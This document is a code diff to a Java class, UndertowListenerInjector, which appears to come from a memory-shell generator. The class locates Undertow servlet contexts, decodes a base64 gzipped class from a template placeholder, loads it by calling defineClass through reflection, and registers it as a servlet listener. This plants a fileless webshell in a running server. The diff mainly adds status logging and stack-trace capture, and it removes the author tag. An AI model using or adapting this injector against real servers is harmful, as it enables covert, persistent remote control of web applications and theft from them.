@@ -3,6 +3,7 @@ package org.leo.jmg.mem.injectortpl.undertow;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.io.PrintStream;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.util.HashSet;
@@ -12,36 +13,63 @@ import java.util.zip.GZIPInputStream;
 
 
 /**
- * @author ReaJason
  */
 public class UndertowListenerInjector {
 
-    private static String shellClassName;
-    private static String shellClass;
-    private static boolean ok;
+    private static String msg = "";
+    private static boolean ok = false;
+
+    public String getClassName() {
+        return "{{className}}";
+    }
+
+    public String getBase64String() throws IOException {
+        return "{{base64Str}}";
+    }
 
     public UndertowListenerInjector() {
         if (ok) {
             return;
         }
-        Set<Object> contexts;
+        Set<Object> contexts = null;
         try {
             contexts = getContext();
         } catch (Throwable throwable) {
-            contexts = null;
+            msg += "context error: " + getErrorMessage(throwable);
         }
-        if (contexts != null && !contexts.isEmpty()) {
+        if (contexts == null || contexts.isEmpty()) {
+            msg += "context not found";
+        } else {
             for (Object context : contexts) {
                 try {
+                    msg += ("context: [" + getContextRoot(context) + "] ");
                     Object shell = getShell(context);
                     inject(context, shell);
-                } catch (Throwable ignored) {
+                    msg += "[/*] ready\n";
+                } catch (Throwable e) {
+                    msg += "failed " + getErrorMessage(e) + "\n";
                 }
             }
         }
         ok = true;
-        shellClass = null;
-        shellClassName = null;
+        System.out.println(msg);
+    }
+
+    @SuppressWarnings("all")
+    private String getContextRoot(Object context) {
+        String r = null;
+        try {
+            r = (String) invokeMethod(context, "getContextPath", null, null);
+        } catch (Exception ignored) {
+        }
+        String c = context.getClass().getName();
+        if (r == null) {
+            return c;
+        }
+        if (r.isEmpty()) {
+            return c + "(/)";
+        }
+        return c + "(" + r + ")";
     }
 
     public Set<Object> getContext() throws Exception {
@@ -72,15 +100,16 @@ public class UndertowListenerInjector {
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
         ClassLoader classLoader = getWebAppClassLoader(context);
-        Class<?> clazz;
+        Class<?> clazz = null;
         try {
-            clazz = classLoader.loadClass(shellClassName);
+            clazz = classLoader.loadClass(getClassName());
         } catch (Exception e) {
-            byte[] clazzByte = gzipDecompress(decodeBase64(shellClass));
+            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
             clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
         }
+        msg += "[" + classLoader.getClass().getName() + "] ";
         return clazz.newInstance();
     }
 
@@ -90,7 +119,7 @@ public class UndertowListenerInjector {
             for (Object allListener : allListeners) {
                 Class<?> l = (Class<?>) getFieldValue(getFieldValue(allListener, "listenerInfo"), "listenerClass");
                 if (l != null) {
-                    if (l.getName().contains(shellClassName)) {
+                    if (l.getName().contains(getClassName())) {
                         return ;
                     }
                 }
@@ -103,6 +132,11 @@ public class UndertowListenerInjector {
         Class<?> managedListenerClass = context.getClass().getClassLoader().loadClass("io.undertow.servlet.core.ManagedListener");
         Object managedListener = managedListenerClass.getConstructor(listenerInfoClass, boolean.class).newInstance(listenerInfo, true);
         invokeMethod(applicationListeners, "addListener", new Class[]{managedListenerClass}, new Object[]{managedListener});
+    }
+
+    @Override
+    public String toString() {
+        return msg;
     }
 
     @SuppressWarnings("all")
@@ -175,4 +209,18 @@ public class UndertowListenerInjector {
         return method.invoke(obj instanceof Class ? null : obj, param);
     }
 
+    @SuppressWarnings("all")
+    private String getErrorMessage(Throwable throwable) {
+        PrintStream printStream = null;
+        try {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            printStream = new PrintStream(outputStream);
+            throwable.printStackTrace(printStream);
+            return outputStream.toString();
+        } finally {
+            if (printStream != null) {
+                printStream.close();
+            }
+        }
+    }
 }
